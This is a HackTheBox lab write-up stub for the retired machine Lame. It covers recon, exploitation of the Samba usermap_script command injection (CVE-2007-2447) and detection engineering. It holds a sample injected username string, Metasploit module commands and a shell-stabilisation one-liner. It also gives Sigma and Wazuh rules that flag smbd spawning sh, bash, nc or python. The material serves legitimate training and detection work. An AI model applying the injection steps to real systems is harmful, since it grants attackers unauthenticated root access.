# Lame — HackTheBox

> **Preparation stub.** Based on publicly documented information about this well-known retired
> machine — not an original solve, and no live flag values are recorded. Use this as a study
> scaffold; complete the bracketed fields when working the box under your own account. Only
> document legally authorised activity.

## Engagement metadata

| Field | Value |
|-------|-------|
| Platform | HackTheBox |
| Machine | Lame |
| Difficulty | Easy |
| Category | Linux |
| Target IP | 10.10.x.x (lab-assigned) |
| Date completed | [YYYY-MM-DD] |

## Executive summary

A legacy Linux host (Ubuntu 8.04-era) running Samba **3.0.20**. The "username map script"
command-injection vulnerability (**CVE-2007-2447**) allows unauthenticated remote code execution
as **root**, because `smbd` processes the username field through a shell when `username map script`
is configured. There is no privilege-escalation step — the service runs as root, so the foothold
*is* root. The box's exposed `vsftpd 2.3.4` banner is a deliberate rabbit hole; its backdoor is
not exploitable here.

## Key vulnerability class

- **CWE:** CWE-78 — OS Command Injection.
- **Identifier:** **CVE-2007-2447** (Samba `usermap_script`), affecting Samba 3.0.0–3.0.25rc3.
- **Why it matters:** a textbook "map the service version to a known exploit" case. The whole path
  turns on reading `smbd 3.0.20` from the scan and knowing it predates the fix — methodology, not
  tooling, finds it.

## 1. Reconnaissance

```
nmap -sC -sV -p- -oA nmap/lame 10.10.x.x
```

Expected exposed surface (confirm on completion):

| Port | Service | Version | Note |
|------|---------|---------|------|
| 21/tcp | ftp | vsftpd 2.3.4 | Banner bait — backdoor not working on this host |
| 22/tcp | ssh | OpenSSH 4.7p1 | Old, but not the path |
| 139/445 tcp | smb | Samba smbd 3.0.20 | **The vector** |
| 3632/tcp | distccd | distccd v1 | Secondary path (CVE-2004-2687) |

[Paste trimmed scan output on completion.]

**nmap flag rationale:**
- `-p-` — scan all 65,535 TCP ports. Never assume a service sits on its standard port; high ports
  are the classic "stuck for an hour" miss.
- `-sV` — service/version detection. On this box the single load-bearing fact is the banner
  `Samba smbd 3.0.20`; the version *is* the vulnerability.
- `-sC` — run the default NSE script category (equivalent to `--script=default`). Cheap banner,
  OS-discovery and config hints with no extra effort.
- `-oA nmap/lame` — write normal/grep/XML output so the version evidence is re-referenceable
  without a noisy rescan.

**What to look for in the scan:** service banners that predate a known fix. `Samba 3.0.20`
(2006-era) and `OpenSSH 4.7p1` both flag a legacy host — pivot straight to version→CVE mapping
rather than content enumeration. One ancient service is usually the whole path.

## 2. Enumeration

```
enum4linux -a 10.10.x.x
smbclient -L //10.10.x.x/ -N
```

- Confirm Samba version `3.0.20` (the version, not the share contents, is what matters).
- **Ruled out:** vsftpd 2.3.4 backdoor (does not trigger here); distcc is a valid alternate path
  but lands as the low-priv `daemon` user and then needs a privesc — slower than the Samba route.
- [Record share listing / null-session results on completion.]

**What to look for after SMB enumeration:** you are confirming the *version string*, not hunting
shares. `enum4linux` echoes the Samba banner in its session output — anything in the range
3.0.0–3.0.25rc3 is CVE-2007-2447-vulnerable. Null-session share access here is a bonus, not the
path; do not rabbit-hole on share contents once the version is confirmed.

## 3. Exploitation

- **Chosen vector and why:** Samba `usermap_script` over distcc — it yields root in a single step
  with no privesc, the cleaner path.
- The injection is delivered through the SMB *username* field (e.g. `/=`nohup <cmd>``), which
  `smbd` passes to a shell. **[ATT&CK T1190 — Exploit Public-Facing Application]** → the shell
  metacharacters are executed by `smbd` **[ATT&CK T1059.004 — Command and Scripting Interpreter:
  Unix Shell]**.

```
# Metasploit path
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.x.x
set LHOST <tun0 ip>
run
# Manual path: smbclient/python that injects a reverse-shell payload into the username field
```

- **Shell lands as `root`** — no further escalation required.
- **User flag:** `[capture on completion]`
- **Root flag:** `[capture on completion]`

## 4. Post-exploitation

- Stabilise the shell (`python -c 'import pty; pty.spawn("/bin/bash")'`).
- Both flags are directly readable as root (`/root/root.txt`, `/home/makis/user.txt` or
  equivalent — confirm path on completion).

## 5. Tools used

| Phase | Tools |
|-------|-------|
| Recon | `nmap` (`-sC -sV -p-`) |
| Enumeration | `enum4linux`, `smbclient` |
| Exploitation | Metasploit `multi/samba/usermap_script` (or a manual injection script) |
| Post-exploitation | manual shell stabilisation |

## 6. MITRE ATT&CK mapping

| Tactic | Technique | ID |
|--------|-----------|-----|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Privilege Escalation | (none required — service runs as root) | — |

## 7. Key learnings

- **Version-to-exploit mapping is the whole game on legacy boxes** — `smbd 3.0.20` is the single
  fact that unlocks the box. Always cross-reference every service version against known CVEs
  *before* trying anything noisy.
- **Not every open port is a path** — the vsftpd 2.3.4 banner is a classic distractor; recognising
  a rabbit hole quickly is a skill in itself.
- **Service account context matters** — when the vulnerable service runs as root, "exploitation"
  and "privesc" collapse into one step.

## 8. Defender perspective — logs & detection

What this attack looks like from a monitored SOC, and the rule that would catch it. (This is the
offence→detection bridge a SOC-analyst role needs to see; see
[../methodology/ctf-methodology.md §7](../methodology/ctf-methodology.md).)

**Log artefacts generated:**
- **Samba logs** (`/var/log/samba/log.smbd`, `log.<client-ip>`): a session-setup whose username
  field contains shell metacharacters (backticks, `nohup`, `/=`) — legitimate usernames never
  contain `` ` `` or `/`.
- **Process telemetry:** the injected command runs as a child of `smbd` executing as **root** —
  an `smbd` parent spawning `/bin/sh`, `bash`, `nc`, or `python` is the anomaly; the SMB daemon
  has no legitimate reason to fork an interactive shell.
- **auditd `execve` records** (if `-a exit,always -F arch=b64 -S execve` is configured) tie the
  shell back to the smbd PID under UID 0.
- **Network:** outbound TCP from the host to the attacker's listener (reverse shell) in firewall /
  NetFlow / Zeek `conn.log`.

**Example detection logic (Sigma-style):**
```yaml
title: Samba usermap_script command injection (CVE-2007-2447)
logsource: { product: linux, service: auditd }
detection:
  selection:
    ParentImage|endswith: '/smbd'
    Image|endswith: ['/sh', '/bash', '/nc', '/python', '/python3']
  condition: selection
level: critical
```
SIEM phrasing: alert when `parent_process == smbd AND child_process IN (sh, bash, nc, python*)`.

**Why it fires:** the exploit *requires* `smbd` to execute a shell — the very behaviour the rule
keys on. Detection is high-fidelity (near-zero false positives) because the malicious behaviour and
the detection signal are the same event. Maps to **ATT&CK T1190 / T1059.004**.

**Defensive controls:** patch Samba (the only real fix); run `smbd` least-privileged; restrict
139/445 to trusted networks; alert on shell metacharacters in any authentication field.

### Wazuh detection rule (→ [watchtower](../../watchtower))

The Sigma logic maps to a Wazuh rule on auditd `execve` records — `smbd` as the parent of a shell is
near-zero false positive:

```xml
<group name="auditd,samba,attack,">
  <!-- smbd (the SMB daemon) spawning an interactive shell = usermap_script injection -->
  <rule id="100490" level="14">
    <if_group>audit_command</if_group>
    <field name="audit.exe" type="pcre2">/(sh|bash|nc|python\d?)$</field>
    <field name="audit.ppid_exe" type="pcre2">/smbd$</field>
    <description>smbd spawned a shell — Samba usermap_script injection CVE-2007-2447 (T1190/T1059.004)</description>
    <mitre><id>T1190</id><id>T1059.004</id></mitre>
  </rule>
  <!-- Companion: shell metacharacters in an SMB auth username -->
  <rule id="100491" level="12">
    <decoded_as>samba</decoded_as>
    <regex type="pcre2">user(name)?=.*[`/].*nohup|/=</regex>
    <description>Shell metacharacters in SMB username field — injection attempt (T1190)</description>
    <mitre><id>T1190</id></mitre>
  </rule>
</group>
```
**Validation:** enable auditd `execve` (`-a exit,always -F arch=b64 -S execve`), run the manual
usermap_script exploit, and confirm 100490 fires at level 14. Because the malicious behaviour *is*
the detection signal, precision is high. Sub-techniques: **T1190** (exploit public-facing app),
**T1059.004** (Unix shell).

## Exam relevance — Sec+ SY0-701

| SY0-701 objective | How Lame makes it concrete |
|-------------------|-----------------------------|
| **2.2 / 2.3** Injection & vulnerable software | Command injection in an EOL Samba (3.0.20) is both "injection attack" and "legacy/unpatched software" in one box. |
| **2.4** Indicators of malicious activity | `smbd` spawning `/bin/sh` and metacharacters in a username are exactly the §2.4 indicators the exam tests. |
| **2.5 / 4.1** Mitigations & hardening | Patch (the only real fix), least-privilege the daemon, segment 139/445 — patch-management + service-hardening from the attacker's side. |
| **3.1** Least privilege / blast radius | `smbd` running as root means injection = instant root; least privilege would have contained it. |
| **4.4 / 4.8** Monitoring & forensics | The near-zero-FP auditd rule is a detection-engineering case study; the §8 artefacts are the forensic trail. |

**Interview line:** "Lame is why I argue for patching EOL software *and* least-privileging daemons —
a single unpatched Samba running as root is root access in one request, and the detection for it is
trivially high-fidelity if you're collecting execve."

## 9. References

- CVE-2007-2447 — Samba `username map script` command injection (verify scope before citing).
- Samba 3.0.20 changelog / security advisory.
- MITRE ATT&CK T1190, T1059.004.
